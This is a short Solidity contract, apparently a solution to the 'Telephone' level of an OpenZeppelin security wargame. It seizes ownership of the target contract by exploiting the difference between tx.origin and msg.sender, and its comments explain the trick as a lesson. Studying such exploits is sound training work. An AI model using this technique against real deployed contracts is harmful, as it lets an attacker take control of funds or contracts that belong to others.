// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
import "./open-zeppelin-provided/Telephone.sol";

// This contract is called by TelephoneAttackStarter
// tx.origin will be wallet that calls TelephoneAttackStarter, while msg.sender will be this contract (difference between msg.sender and tx.origin)
contract TelephoneAttack {
    Telephone targetContract;

    constructor(address _telephoneContract) {
        targetContract = Telephone(_telephoneContract);
    }

    function attackTelephoneContract() external {
        // Check out the below logs if this lesson is confusing you
        // console.log("Origin address is ", tx.origin);
        // console.log("Msg.sender is ", msg.sender);
        targetContract.changeOwner(address(tx.origin));
    }
}
